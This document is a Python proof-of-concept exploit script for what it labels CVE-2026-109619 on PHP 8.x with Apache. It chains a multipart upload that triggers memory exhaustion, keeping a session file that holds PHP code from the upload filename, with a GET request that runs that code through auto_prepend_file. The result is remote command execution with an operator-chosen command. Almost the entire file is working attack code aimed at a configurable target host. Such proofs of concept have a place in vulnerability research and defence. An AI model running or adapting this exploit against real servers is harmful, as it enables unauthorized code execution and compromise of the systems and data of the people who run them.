#!/usr/bin/env python3
"""
CVE-2026-109619 → HTTP RCE
Target: PHP 8.x + Apache (post_max_size ≥ memory_limit)

Prerequisites (set up before running):
  1. .htaccess in web root with:  php_value auto_prepend_file <session_path>
  2. post_max_size ≥ memory_limit (via php.ini or .htaccess)

Chain
─────
1. Producer OOM: multipart upload with PHP code in filename
   → OOM prevents session RSHUTDOWN → session file preserved on disk
   → session file contains:  s:30:"<?php system('id');die(); ?>"
2. Trigger GET: Apache includes session file via auto_prepend_file
   → PHP parser finds <?php tag inside serialised data → executes it → RCE
"""
import os, socket, sys, threading, time

# ── config ──────────────────────────────────────────────────
HOST = os.environ.get("TARGET_HOST", "127.0.0.1")
PORT = int(os.environ.get("TARGET_PORT", "80"))
SID  = "rce001"
SESS_PATH = os.environ.get("SESSION_PATH", "/var/lib/php/sessions")
SESS = f"{SESS_PATH}/sess_{SID}"
CMD  = os.environ.get("CMD", "id")
PHP  = f"<?php system('{CMD}');die(); ?>"

# ── helpers ─────────────────────────────────────────────────
def multipart(parts, bnd):
    buf = bytearray()
    for p in parts:
        nm = p["name"] if isinstance(p["name"], bytes) else p["name"].encode()
        dt = p["data"] if isinstance(p["data"], bytes) else p["data"].encode()
        buf += b"--" + bnd + b"\r\n"
        buf += b'Content-Disposition: form-data; name="' + nm + b'"'
        if "filename" in p:
            fn = p["filename"] if isinstance(p["filename"], bytes) else p["filename"].encode()
            buf += b'; filename="' + fn + b'"'
            buf += b"\r\nContent-Type: application/octet-stream"
        buf += b"\r\n\r\n" + dt + b"\r\n"
    buf += b"--" + bnd + b"--\r\n"
    return bytes(buf)

def http_req(method, path, body=None, bnd=None, timeout=120):
    if body:
        hdr = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
    else:
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
    sock = socket.create_connection((HOST, PORT), timeout=timeout)
    sock.settimeout(timeout)
    data = bytearray()
    def rx():
        try:
            while True:
                c = sock.recv(65536)
                if not c:
                    break
                data.extend(c)
        except Exception:
            pass
    t = threading.Thread(target=rx, daemon=True)
    t.start()
    try:
        sock.sendall(hdr)
        if body:
            for off in range(0, len(body), 262144):
                sock.sendall(body[off:off + 262144])
    except Exception:
        pass
    t.join(timeout=timeout + 1)
    sock.close()
    return bytes(data)

def resp_body(raw):
    if b"\r\n\r\n" in raw:
        return raw.split(b"\r\n\r\n", 1)[1]
    return raw

def resp_status(raw):
    if raw:
        return raw.split(b"\r\n", 1)[0].decode("latin1", errors="replace")
    return "(empty)"

# ════════════════════════════════════════════════════════════
print("=" * 60)
print("CVE-2026-109619  HTTP → RCE  (auto_prepend_file)")
print(f"Target  {HOST}:{PORT}    CMD: {CMD}")
print(f"Session: {SESS}")
print("=" * 60)

print("\nPrerequisites:")
print(f"  1. .htaccess with: php_value auto_prepend_file {SESS}")
print(f"  2. post_max_size ≥ memory_limit")

# ── 1  producer OOM ────────────────────────────────────────
print(f"\n[1] producer OOM   SID={SID}")
print(f"    filename = {PHP}")
body = multipart([
    {"name": "PHPSESSID",                   "data": SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS",  "data": "pwn"},
    {"name": "f", "filename": PHP,           "data": b"A" * 64},
    {"name": "big",                          "data": b"B" * (12 * 1024 * 1024)},
], b"BOOM")
print(f"    sending {len(body)} bytes …")
r1 = http_req("POST", "/ok.php", body, b"BOOM", timeout=120)
print(f"    {resp_status(r1)}")

if b"500" in r1[:50] or len(r1) == 0:
    print("    ✓ OOM triggered (500 / connection reset)")
else:
    print(f"    ? unexpected response")

time.sleep(0.5)

# ── 2  trigger RCE ─────────────────────────────────────────
print(f"\n[2] trigger: GET /ok.php")
print(f"    auto_prepend_file should include {SESS}")
r2 = http_req("GET", "/ok.php", timeout=10)
out = resp_body(r2).decode("latin1", errors="replace")

# ── result ─────────────────────────────────────────────────
print("\n" + "=" * 60)
if "uid=" in out:
    idx = out.index("uid=")
    end = out.find("\n", idx)
    line = out[idx:end].strip() if end > 0 else out[idx:idx + 80].strip()
    print(f"  ★  RCE confirmed: {line}")
elif out.strip():
    print(f"  ?  response ({len(out)} chars):")
    print(f"     {out[:500]}")
else:
    print("  ✗  empty response — check prerequisites")
print("=" * 60)
